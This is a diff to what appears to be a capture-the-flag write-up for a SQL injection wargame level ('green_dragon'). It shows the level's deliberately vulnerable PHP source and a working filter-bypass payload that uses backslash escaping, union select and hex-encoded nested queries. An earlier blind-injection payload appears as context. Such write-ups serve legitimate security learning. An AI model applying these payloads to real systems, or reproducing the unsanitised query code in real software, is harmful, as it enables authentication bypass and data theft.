@@ -735,7 +735,36 @@ payload: exp(800\*if(id="admin" and ord(substr({pw},{i},1))={j} , 1, 0))
 
 if false 800 \* 0 = 0 => rubiya805 , if true 800 \* 1 = 800 => DOUBLE value is out of range => rubiya805 not in r.text
 
+## Green\_Dragon(bypass filter)
 
+```php
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']){
+    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
+    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
+    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
+    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
+    $result = mysqli_fetch_array(mysqli_query($db,$query2));
+    if($result['id'] == "admin") solve("green_dragon");
+  }
+  highlight_file(__FILE__);
+?>
+
+```
+
+payload:  id=\\\&pw= union select char(92),0x20756e696f6e2073656c656374203078363136343664363936652d2d202d-- -
+
+char(92) = \ , hex = union select 0x61646d696e-- -
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
